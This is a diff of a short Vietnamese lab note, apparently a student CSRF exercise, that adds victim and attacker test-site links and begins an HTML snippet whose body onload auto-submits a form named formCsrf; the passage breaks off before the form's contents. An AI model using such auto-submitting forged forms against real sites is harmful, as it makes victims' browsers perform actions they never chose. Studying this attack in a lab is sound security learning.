@@ -1,7 +1,10 @@
 Người thực hiện: Lê Trần Văn Chương
 Ngày: 18/04/2022
 
-Nhúng đoạn code sau vào:
+- Link: 
+    - Victim: https://00bluec10.000webhostapp.com/index.php
+    - Attack: https://php-bacsic.000webhostapp.com/
+- Nhúng đoạn code sau vào:
 ```html
 <body onload="document.formCsrf.submit()">
     <div>
